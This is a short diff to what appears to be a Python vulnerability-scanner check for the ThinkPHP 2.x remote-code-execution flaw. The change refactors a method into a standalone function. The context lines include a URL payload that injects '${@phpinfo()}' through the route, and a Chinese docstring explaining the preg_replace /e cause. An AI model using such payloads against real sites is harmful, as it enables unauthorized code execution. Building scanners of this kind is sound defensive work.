@@ -5,7 +5,7 @@ thinkphp_2_x_rce_payloads = [
     {'path': 'index.php?s=/index/index/name/$%7B@phpinfo()%7D'},
 ]
 
-def _2_x_rce_scan(self, clients):
+def rce_2_x_scan(clients):
     ''' ThinkPHP 2.x版本中, 使用preg_replace的/e模式匹配路由; 
             导致用户的输入参数被插入双引号中执行, 造成任意代码执行漏洞; 
             ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞, 也存在这个漏洞
@@ -13,7 +13,7 @@ def _2_x_rce_scan(self, clients):
     client = clients.get('reqClient')
     
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'ThinkPHP',
         'vul_type': 'RCE',
         'vul_id': 'thinkphp-2.x-rce',
     }
